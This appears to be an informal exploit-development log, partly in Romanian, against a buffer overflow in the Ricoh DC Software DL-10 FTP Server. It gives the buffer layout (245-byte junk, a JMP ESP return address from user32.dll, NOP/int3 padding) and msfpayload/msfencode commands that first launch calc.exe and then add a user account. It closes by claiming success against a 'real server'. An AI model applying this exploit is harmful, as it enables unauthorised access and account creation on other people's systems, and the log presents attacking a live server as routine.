Ricoh DC Software DL-10 FTP Server (SR10.exe) <= 1.1.0.6 Remote Buffer Overflow Vulnerability
Escaladare de privilegii + read some important file.

Luam exploitul : http://www.exploit-db.com/exploits/18643/ si testam

... va urma...

EIP e owerwrited with \x42\x42\x42\x42
We search for JMP ESP in user32.dll and we find 0x77D20738

We edit shellcode something like this :

junk = "\x41" * 245
eip = "\x38\x07\xD2\x77"; #0x77D20738 #jmp esp from user32.dll
nops = "\xCC" * 20

We rebuild and then we see that program stops with int3 ret.

We then check that we have enought space and we edit nops with nops = "\xCC" * 300 and see that works fine so we have some memory space available for writing

we add calculator.exe metasploit exploit with some chars disabled by default : 

msfpayload windows/exec CMD=calc.exe R | msfencode -b '\x00\x0a\x0d'

and boom.

Next we try to add a full user 

msfpayload windows/adduser USER=alex PASS=Alex@1234 R | msfencode -b '\x00\x0a\x0d'

and it worked

now we try to the real server 


we are in